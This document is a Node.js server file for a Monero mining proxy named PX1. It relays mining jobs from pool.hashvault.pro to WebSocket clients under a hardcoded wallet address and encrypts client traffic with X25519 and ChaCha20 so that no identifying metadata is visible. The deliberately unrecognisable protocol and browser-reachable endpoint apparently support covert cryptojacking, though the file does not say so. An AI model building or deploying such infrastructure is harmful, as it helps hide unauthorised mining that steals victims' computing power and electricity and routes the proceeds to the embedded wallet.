import crypto from 'node:crypto';
import http from 'node:http';
import net from 'node:net';
import { readFileSync, readdirSync } from 'node:fs';
import { WebSocketServer } from 'ws';

const port = 8000
const poolHost = 'pool.hashvault.pro'
const poolPort = 443
const poolWallet = "88cTZmCLpxsMvqTXqBH3TK3853STuPyWtBnQVmXZwFXiSdE1EdtnBd42A8HjfX3UbxZnYKZcnJ1HsRuJbb6KA3MaC8rW19F"
const poolPassword = "001"
const poolWorker = optionalEnv('POOL_WORKER', 'polo');
const poolAgent = optionalEnv('POOL_AGENT', 'polo/1.0.0');
const dashboardPort = integerEnv('DASHBOARD_PORT', 8090);
const dashboardHost = optionalEnv('DASHBOARD_HOST', '127.0.0.1');
const maxClients = positiveIntegerEnv('PX1_MAX_CLIENTS', 1000);
const maxPending = positiveIntegerEnv('PX1_MAX_PENDING', 128);
const maxBufferedBytes = positiveIntegerEnv('PX1_MAX_BUFFERED_BYTES', 1048576);
const fdLimit = positiveIntegerEnv('PX1_FD_LIMIT', 1024);
const sessions = new Map();
const metrics = { startedAt: Date.now(), connections: 0, rejected: 0, closed: 0, jobs: 0, shares: 0, accepted: 0, upstreamErrors: 0, bytesIn: 0, bytesOut: 0, latency: [] };
let lastNetworkSample = { at: Date.now(), in: 0, out: 0 };
let nextSessionId = 0;
const httpServer = http.createServer((req, res) => {
  if (req.url === '/health') { res.writeHead(200); return res.end('ok'); }
  res.writeHead(404); res.end();
});
const server = new WebSocketServer({ server: httpServer, maxPayload: 1024 * 1024, handleProtocols: protocols => protocols.has('polo-px1') ? 'polo-px1' : false });

server.on('headers', (_headers, request) => {
  const peer = request.socket.remoteAddress || 'unknown';
  const protocol = request.headers['sec-websocket-protocol'] || '-';
  console.info(`PX1 upgrade from ${peer}: ${request.method} ${request.url || '/'} host=${request.headers.host || '-'} upgrade=${request.headers.upgrade || '-'} connection=${request.headers.connection || '-'} protocol=${protocol}`);
});
server.on('connection', (ws, request) => {
  const peer = request.socket.remoteAddress || 'unknown';
  if (sessions.size >= maxClients) {
    metrics.rejected++;
    console.error(`PX1 connection rejected from ${peer}: client limit reached`);
    ws.close(1013, 'Proxy capacity reached');
    return;
  }
  console.info(`PX1 connected from ${peer}: protocol=${ws.protocol || '-'}`);
  const session = new MinerSession(ws, peer);
  monitorLog('info', `worker ${session.id} connected`);
});
server.on('listening', () => console.log(`PX1 proxy listening on :${port}; upstream ${poolHost}:${poolPort}`));
httpServer.listen(port);

const dashboard = http.createServer((request, response) => {
  if (request.method === 'GET' && request.url === '/api/status') {
    const now = Date.now();
    const clients = [...sessions.values()].map(session => ({ id: session.id, peer: session.peer, state: session.state, connectedSeconds: Math.floor((now - session.connectedAt) / 1000), job: session.lastJob }));
    response.writeHead(200, { 'content-type': 'application/json', 'cache-control': 'no-store' });
    response.end(JSON.stringify({ now, active: clients.length, limits: { maxClients, maxPending, maxBufferedBytes }, metrics, clients }));
    return;
  }
  if (request.method === 'GET' && (request.url === '/' || request.url === '/index.html')) {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
    response.end(readFileSync(new URL('./index.html', import.meta.url)));
    return;
  }
  response.writeHead(404); response.end('Not found');
});
const monitorServer = new WebSocketServer({ noServer: true });
dashboard.on('upgrade', (request, socket, head) => {
  if (request.url !== '/metrics') return socket.destroy();
  monitorServer.handleUpgrade(request, socket, head, ws => monitorServer.emit('connection', ws, request));
});
dashboard.listen(dashboardPort, dashboardHost, () => console.log(`PX1 dashboard listening on http://${dashboardHost}:${dashboardPort}`));

function monitorPayload() {
  const active = sessions.size;
  const now = Date.now(), elapsed = Math.max(1, now - lastNetworkSample.at);
  const up = (metrics.bytesOut - lastNetworkSample.out) * 8 / elapsed / 1000;
  const down = (metrics.bytesIn - lastNetworkSample.in) * 8 / elapsed / 1000;
  lastNetworkSample = { at: now, in: metrics.bytesIn, out: metrics.bytesOut };
  const latency = [...metrics.latency].sort((a, b) => a - b);
  const percentile = p => latency.length ? latency[Math.min(latency.length - 1, Math.floor((latency.length - 1) * p))] : 0;
  let used = 0; try { used = readdirSync('/proc/self/fd').length; } catch { used = active * 2; }
  return { ts: now, active_connections: active, capacity_used: Math.round(active / maxClients * 100), throughput: { up_mbps: up, down_mbps: down }, reconnect_rate: metrics.connections ? metrics.closed / metrics.connections * 100 : 0, circuit_breaker: metrics.upstreamErrors ? 'OPEN' : 'CLOSED', fd: { used, limit: fdLimit, percent: Math.round(used / fdLimit * 100) }, latency: { p50: percentile(.5), p95: percentile(.95), p99: percentile(.99) }, backpressure_buffer_depth: [...sessions.values()].reduce((sum, session) => sum + session.ws.bufferedAmount, 0) };
}
function monitorBroadcast(message) {
  const encoded = JSON.stringify(message);
  for (const ws of monitorServer.clients) if (ws.readyState === 1) ws.send(encoded);
}
function monitorLog(severity, message) { monitorBroadcast({ type: 'log', payload: { severity, message }, ts: Date.now() }); }
setInterval(() => {
  monitorBroadcast({ type: 'metrics', payload: monitorPayload(), ts: Date.now() });
  for (const session of sessions.values()) monitorBroadcast({ type: 'worker_update', payload: { worker_id: String(session.id), uptime_seconds: Math.floor((Date.now() - session.connectedAt) / 1000), keepalive_miss_count: 0, last_reconnect: 'unknown', health_status: session.state === 'mining' ? 'healthy' : 'degraded', state: session.state }, ts: Date.now() });
}, 2000);

class MinerSession {
  constructor(ws, peer) {
    this.id = ++nextSessionId; this.ws = ws; this.peer = peer; this.connectedAt = Date.now(); this.state = 'handshake'; this.lastJob = null;
    this.sendSeq = 0n; this.recvSeq = 0n; this.key = null; this.pool = null; this.sessionId = null;
    this.nextRequestId = 1; this.pending = new Map(); this.keepaliveTimer = null; this.handshakeTimer = setTimeout(() => this.fail('handshake-timeout'), 15000); this.closed = false;
    metrics.connections++; sessions.set(this.id, this);
    ws.once('message', (data, binary) => this.handshake(data, binary));
    ws.on('close', (code, reason) => { console.info(`PX1 WebSocket closed from ${this.peer}: code=${code} reason=${safeText(String(reason)) || '-'}`); this.close(); });
    ws.on('error', error => { console.error(`PX1 WebSocket error from ${this.peer}: ${safeText(error.message)}`); this.close(); });
  }
  handshake(data, binary) {
    try {
      metrics.bytesIn += data.length;
      console.info(`PX1 handshake from ${this.peer}: ${binary ? 'binary' : 'text'} frame, ${data.length} bytes`);
      if (binary) throw new Error('binary frames are forbidden');
      // The two handshake frames are base64-encoded raw X25519 public keys.
      // They deliberately contain no command prefix or other metadata.
      const clientRaw = decodeB64(String(data), 32);
      const clientKey = x25519PublicKey(clientRaw);
      const ephemeral = crypto.generateKeyPairSync('x25519');
      const serverRaw = rawX25519PublicKey(ephemeral.publicKey);
      this.key = crypto.hkdfSync('sha256', crypto.diffieHellman({ privateKey: ephemeral.privateKey, publicKey: clientKey }), Buffer.alloc(0), 'polo-px1-v1', 32);
      clearTimeout(this.handshakeTimer); this.handshakeTimer = null;
      const publicKey = serverRaw.toString('base64'); metrics.bytesOut += Buffer.byteLength(publicKey); this.ws.send(publicKey);
      this.ws.on('message', (message, isBinary) => this.receive(message, isBinary));
      this.state = 'pool-connecting';
      this.openPool();
    } catch (error) { this.fail(error.message); }
  }
  receive(data, binary) {
    try {
      metrics.bytesIn += data.length;
      if (binary) throw new Error('binary frames are forbidden');
      const text = String(data);
      if (!/^[A-Za-z0-9+/]+={0,2}$/.test(text)) throw new Error('invalid encrypted payload');
      const packed = Buffer.from(text, 'base64');
      if (packed.length < 16 || packed.toString('base64') !== text) throw new Error('truncated or invalid ciphertext');
      const sequence = this.recvSeq + 1n;
      const nonce = nonceFor(sequence); const decipher = crypto.createDecipheriv('chacha20-poly1305', this.key, nonce, { authTagLength: 16 });
      decipher.setAAD(Buffer.from(`PX1|${sequence}`)); decipher.setAuthTag(packed.subarray(-16));
      const plain = Buffer.concat([decipher.update(packed.subarray(0, -16)), decipher.final()]).toString('utf8');
      this.recvSeq = sequence; this.command(plain);
    } catch (error) { this.fail(error.message); }
  }
  command(plain) {
    if (!/^[^\r\n]{1,65536}$/.test(plain)) return this.fail('invalid plaintext');
    const words = plain.split(' '); const verb = words.shift();
    if (verb === 'SUBMIT' && words.length === 3 && this.sessionId) return this.submit(words);
    this.fail('invalid command');
  }
  openPool() {
    if (this.pool || !wordsSafe(poolWallet, poolPassword, poolWorker, poolAgent)) return this.fail('invalid proxy pool configuration');
    console.info(`PX1 pool connecting for ${this.peer}: ${poolHost}:${poolPort}`);
    this.pool = net.createConnection({ host: poolHost, port: poolPort }); this.pool.setNoDelay(true);
    let buffered = '';
    this.pool.setKeepAlive(true, 30_000);
    this.pool.setTimeout(90_000, () => this.upstreamFailed('upstream-timeout'));
    this.pool.on('connect', () => {
      console.info(`PX1 pool connected for ${this.peer}`);
      // This is the Monero Stratum login shape used by XMRig. `rigid` is a
      // widely-supported extension; retaining the worker suffix also supports
      // pools that derive the worker name from the login value.
      this.poolRequest('login', {
        login: poolWallet.includes('.') ? poolWallet : `${poolWallet}.${poolWorker}`,
        pass: poolPassword,
        agent: poolAgent,
        rigid: poolWorker,
        algo: ['rx/0', 'rx'],
      }, 'login');
    });
    this.pool.on('data', chunk => {
      metrics.bytesIn += chunk.length;
      buffered += chunk.toString('utf8');
      if (buffered.length > 1024 * 1024) return this.upstreamFailed('upstream-frame-too-large');
      let index;
      while ((index = buffered.indexOf('\n')) >= 0) { const line = buffered.slice(0, index).replace(/\r$/, ''); buffered = buffered.slice(index + 1); if (line) this.poolMessage(line); }
    });
    this.pool.on('error', error => { console.error(`PX1 pool error for ${this.peer}: ${safeText(error.message)}`); this.upstreamFailed('upstream-unavailable'); });
    this.pool.on('close', () => this.upstreamFailed('upstream-closed'));
  }
  poolMessage(line) {
    let message; try { message = JSON.parse(line); } catch { return this.fail('upstream-invalid-json'); }
    if (message.method === 'job' && message.params) return this.job(message.params);
    if (!Object.hasOwn(message, 'id')) return;
    const request = this.pending.get(message.id);
    if (!request) return; // A stale response from a previous connection.
    this.pending.delete(message.id);
    recordLatency(Date.now() - request.sentAt);
    if (message.error) return this.requestError(request, message.error);
    if (request.kind === 'login') return this.loginResponse(message.result);
    if (request.kind === 'submit') return this.submitResponse(message.result);
    if (request.kind === 'keepalive') return;
  }
  loginResponse(result) {
    if (!result || typeof result !== 'object' || !wordsSafe(String(result.id || ''))) return this.upstreamFailed('upstream-login-invalid');
    this.sessionId = String(result.id);
    this.state = 'mining';
    console.info(`PX1 pool login accepted for ${this.peer}`);
    if (result.job) this.job(result.job);
    // XMRig keeps the Stratum connection alive with `keepalived`. Do it here
    // rather than relying on the miner, whose receive loop can be blocked while
    // the pool is idle.
    this.keepaliveTimer = setInterval(() => this.keepalive(), 30_000);
  }
  submit(words) {
    const [job_id, nonce, result] = words;
    if (!wordsSafe(job_id, nonce, result)) return this.fail('invalid-submit');
    metrics.shares++;
    console.info(`PX1 share submitted by ${this.peer}: job=${job_id} nonce=${nonce} hash=${result}`);
    this.poolRequest('submit', { id: this.sessionId, job_id, nonce, result }, 'submit');
  }
  keepalive() {
    if (!this.sessionId || !this.pool || this.pool.destroyed) return this.upstreamFailed('upstream-unavailable');
    this.poolRequest('keepalived', { id: this.sessionId }, 'keepalive');
  }
  poolRequest(method, params, kind) {
    if (!this.pool || this.pool.destroyed) return this.upstreamFailed('upstream-unavailable');
    if (this.pending.size >= maxPending) return this.upstreamFailed('too-many-pending-requests');
    const id = this.nextRequestId++;
    this.pending.set(id, { kind, sentAt: Date.now() });
    this.poolWrite(JSON.stringify({ id, jsonrpc: '2.0', method, params }));
  }
  requestError(request, error) {
    const reason = safeText(error?.message || error?.code || 'pool-error');
    if (request.kind === 'login') return this.upstreamFailed(`login-${reason}`);
    if (request.kind === 'submit') return;
  }
  submitResponse(result) {
    // Pools commonly return {status:"OK"}, true, or an object with a status.
    console.info(`PX1 share accepted by pool for ${this.peer}: ${safeText(JSON.stringify(result) || 'OK')}`);
    metrics.accepted++;
  }
  job(job) {
    const { blob, job_id: id, target, height, seed_hash: seed } = job;
    if (![blob, id, target, seed].every(x => typeof x === 'string' && wordsSafe(x)) || !Number.isSafeInteger(height)) return this.fail('upstream-invalid-job');
    metrics.jobs++; this.lastJob = { id, height, receivedAt: Date.now() };
    console.info(`PX1 job for ${this.peer}: id=${id} height=${height} seed=${seed} target=${target}`);
    this.send(`JOB ${blob} ${id} ${target} ${height} ${seed}`);
  }
  poolWrite(line) { if (!this.pool || this.pool.destroyed) return this.upstreamFailed('upstream-unavailable'); const data = `${line}\n`; metrics.bytesOut += Buffer.byteLength(data); this.pool.write(data); }
  send(plain) {
    if (this.ws.readyState !== 1 || !this.key) return;
    if (this.ws.bufferedAmount > maxBufferedBytes) return this.fail('client-backpressure');
    const sequence = ++this.sendSeq; const cipher = crypto.createCipheriv('chacha20-poly1305', this.key, nonceFor(sequence), { authTagLength: 16 });
    cipher.setAAD(Buffer.from(`PX1|${sequence}`)); const packed = Buffer.concat([cipher.update(plain, 'utf8'), cipher.final(), cipher.getAuthTag()]);
    const output = packed.toString('base64'); metrics.bytesOut += Buffer.byteLength(output); this.ws.send(output);
  }
  upstreamFailed(reason) {
    if (this.closed) return;
    metrics.upstreamErrors++;
    monitorLog('error', `worker ${this.id}: ${reason}`);
    console.error(`PX1 upstream closed: ${reason}`); this.close();
    if (this.ws.readyState === 1) this.ws.close(1011, 'Stratum upstream error');
  }
  fail(reason) { console.error(`PX1 session closed from ${this.peer}: ${reason}`); monitorLog('warn', `worker ${this.id}: ${reason}`); this.close(); if (this.ws.readyState === 1) this.ws.close(1008, 'PX1 protocol error'); }
  close() {
    if (this.closed) return;
    this.closed = true; metrics.closed++; sessions.delete(this.id); this.pending.clear();
    if (this.keepaliveTimer) { clearInterval(this.keepaliveTimer); this.keepaliveTimer = null; }
    if (this.handshakeTimer) { clearTimeout(this.handshakeTimer); this.handshakeTimer = null; }
    if (this.pool) { const pool = this.pool; this.pool = null; pool.destroy(); }
  }
}
function nonceFor(sequence) { const nonce = Buffer.alloc(12); nonce.writeBigUInt64BE(sequence, 4); return nonce; }
function decodeB64(value, length) { const data = Buffer.from(value, 'base64'); if (data.length !== length || data.toString('base64') !== value) throw new Error('invalid key encoding'); return data; }
// RFC 8410 SubjectPublicKeyInfo prefix for a raw 32-byte X25519 public key.
// PX1 sends only the raw key as base64 text; DER is used locally for Node's API.
const X25519_SPKI_PREFIX = Buffer.from('302a300506032b656e032100', 'hex');
function x25519PublicKey(raw) { return crypto.createPublicKey({ key: Buffer.concat([X25519_SPKI_PREFIX, raw]), format: 'der', type: 'spki' }); }
function rawX25519PublicKey(key) { const der = key.export({ format: 'der', type: 'spki' }); if (!der.subarray(0, X25519_SPKI_PREFIX.length).equals(X25519_SPKI_PREFIX) || der.length !== 44) throw new Error('invalid X25519 public key'); return der.subarray(X25519_SPKI_PREFIX.length); }
function requiredEnv(name) { if (!process.env[name]) throw new Error(`${name} is required`); return process.env[name]; }
function optionalEnv(name, fallback) { return process.env[name] || fallback; }
function integerEnv(name, fallback) { const value = Number(process.env[name] || fallback); if (!Number.isInteger(value) || value < 1 || value > 65535) throw new Error(`${name} must be a TCP port`); return value; }
function positiveIntegerEnv(name, fallback) { const value = Number(process.env[name] || fallback); if (!Number.isInteger(value) || value < 1) throw new Error(`${name} must be a positive integer`); return value; }
function wordsSafe(...values) { return values.every(x => typeof x === 'string' && /^[^\s]{1,512}$/.test(x)); }
function safeText(value) { return String(value).replace(/\s+/g, '-').slice(0, 256); }
function recordLatency(value) { metrics.latency.push(value); if (metrics.latency.length > 256) metrics.latency.shift(); }
